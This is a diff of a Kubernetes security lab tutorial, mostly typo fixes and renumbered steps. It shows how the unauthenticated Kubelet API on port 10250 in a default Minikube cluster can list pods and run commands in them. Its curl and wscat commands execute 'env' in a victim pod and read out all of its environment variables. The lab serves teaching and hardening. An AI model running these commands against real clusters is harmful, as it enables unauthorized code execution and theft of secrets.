@@ -6,50 +6,44 @@ So let's exploit this "misconfiguration" within Minikube.
 
 ## Task 1: Spin up a default Kubernetes cluster
 
-1. Start Minikube using the default LocalKube bootstrapper:
+1. Start Minikube using the default localkube bootstrapper:
 ```
 minikube delete
 minikube start
 ```
 
-2. Exec into the Kubernetes master and take a look at the kubelet configs:
-```
-minikube ssh
-# grab your minikube IP address
-minikube ip
-```
-
-3. The Kubelet API runs on every node. If an individual as network access to a node in the kubernetes cluster, they are able to do some interesting things by default, including "exec-ing" into running pods!
+2. The Kubelet API runs on every node in a cluster. If an individual has network access to a node in the kubernetes cluster, they are able to do some interesting things by default, including "exec-ing" into running pods. 
 ```
 # port 10250 is the read/write port that the Kubelet API uses for communication to the master node
+minikube ip
 curl --insecure https://<minikubeIP>:10250/pods | jq
-# jq is a tool to prettify JSON output - it is optional here but very useful
+# jq is a tool to prettify JSON output - it is optional 
 ```
 
-4. As you can see, using a default implementation of Minikube (any many other kubernetes production boots trappers) we are able to list all of the pods running on a given node. This seems bad. Let's try to Exec and do some damage. First, we launch some pods to take over. In the `manifests` directory, run the following command:
+3. As you can see, using a default implementation of Minikube (and many other kubernetes production bootstrappers) we are able to list all of the pods running on a given node with a simple `curl` command. This seems bad, right? Let's try to Exec and do some real damage. First, we launch some victim pods to take over. In the `manifests` directory, run the following command:
 ```
-Kubectl create -f .
-Kubectl get pods
+kubectl create -f .
+kubectl get pods
 ```
 
-5. Now we have our unshorten-api Deployment and Service up and running we can extract details from them using the same `curl` command we used before:
+4. Now we have our unshorten-api Deployment and Service up and running we can extract details from them using the same `curl` command we used before:
 ```
 curl --insecure https://<minikubeIP>:10250/pods | jq
 ```
 
-6. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`
+5. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`
 
-7. Now, we take that Pod name and run another curl command. Reading Pod data is interesting but we want to do some damage:
+6. Now, we take that Pod name and run another curl command. Reading Pod data is interesting but we want to do some damage:
 ```
-curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.99.100:10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env | grep&input=1&output=1&tty=1"
+curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.99.100:10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env&input=1&output=1&tty=1"
 ```
 
-8. This opens a stream which we can access using [wscat](https://www.npmjs.com/package/wscat). Take note of the `location:` header as we will be using that value to read from the stream. You can install `wscat` using the link above. Once `wscat` is installed, run the following command:
+7. This opens a stream which we can access using [wscat](https://www.npmjs.com/package/wscat). Take note of the `location:` header as we will be using that value to read from the stream. You can install `wscat` using the link above. Once `wscat` is installed, run the following command:
 ```
 wscat -c "https://<minikubeIP>:10250/cri/exec/<valueFrom302>" --no-check
 ```
 
-9. These are *all of the environment variables* for our unshorten-api pod, printed to the scree, unauthenticated. 
+8. These are *all of the environment variables* for our unshorten-api pod, printed to the scree, unauthenticated. 
 
 See any issues here?
 
